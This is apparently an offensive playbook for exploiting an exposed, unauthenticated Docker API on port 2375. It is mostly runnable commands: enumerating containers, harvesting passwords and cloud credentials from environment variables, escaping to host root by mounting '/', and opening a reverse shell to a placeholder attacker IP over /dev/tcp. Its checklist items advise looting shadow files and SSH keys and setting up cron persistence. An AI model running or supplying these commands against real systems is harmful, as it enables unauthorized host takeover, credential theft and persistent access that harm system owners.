# Docker API

## Before I start
- [ ] 2375 open → test unauth immediately
curl -s http://<TargetIP>:2375/version | jq

## Enumerate
export DOCKER_HOST=tcp://<TargetIP>:2375
docker ps
docker images
docker inspect <Container>
docker logs <Container>
- [ ] inspect dumps ENV VARS — DB passwords, API keys, cloud creds. Loot before escalating

## Escape to host root
docker -H tcp://<TargetIP>:2375 run --rm -v /:/host -it alpine chroot /host bash
docker -H tcp://<TargetIP>:2375 run --rm -v /:/host alpine sh -c 'chroot /host bash -c "bash -i >& /dev/tcp/<AttackerIP>/443 0>&1"'
- [ ] Root on the host filesystem: shadow, SSH keys into /root/.ssh/, cron persistence

## No local docker client
curl -s http://<TargetIP>:2375/images/json
- [ ] REST: POST /containers/create + /containers/{id}/start with HostConfig.Binds ["/:/host"]

## If it fails
- [ ] 2376 with proper tlsverify → need the CA/client certs; hunt them on the host or in repos
- [ ] Version answers but ps 401s → auth plugin; loot-first via other doors

## Related
- [ ] On the host in the docker group → same escape locally: :Pb docker-lxd
- [ ] Orchestrated fleet exposed → :Pb kubernetes

## Next
- [ ] Host root → :Pb linux-creds, persistence
- [ ] Cloud creds from env vars → cloud enum
